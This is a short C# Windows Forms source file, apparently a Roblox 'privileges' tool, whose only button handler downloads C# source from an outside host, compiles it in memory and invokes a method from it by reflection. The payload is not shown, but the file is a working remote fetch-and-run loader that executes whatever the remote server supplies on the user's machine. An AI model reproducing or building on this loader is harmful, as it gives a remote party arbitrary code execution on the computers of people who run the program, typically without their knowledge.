using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.CSharp;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace MorePrivileges.ROBLOX
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (var wb = new System.Net.WebClient())
            {
                var GetCSharpCodeFrom = wb.DownloadString("https://cdn.trollicus.com/IsRBX.txt");

                CSharpCodeProvider provider = new CSharpCodeProvider();
                
                var parms = new CompilerParameters
                {
                    GenerateInMemory = true,
                    GenerateExecutable = false,
                    ReferencedAssemblies = { "System.Windows.Forms.dll", "System.Net.dll", "System.dll", "Newtonsoft.Json.dll", "System.Core.dll"}
                    
                };
                
                CompilerResults results = provider.CompileAssemblyFromSource(parms, GetCSharpCodeFrom);

                Assembly asm = results.CompiledAssembly;
                Type type = asm.GetType("ROBLOX.Check");
                MethodInfo info = type.GetMethod("GetUpdate");
                info.Invoke(null, null);

            }
        }
    }
}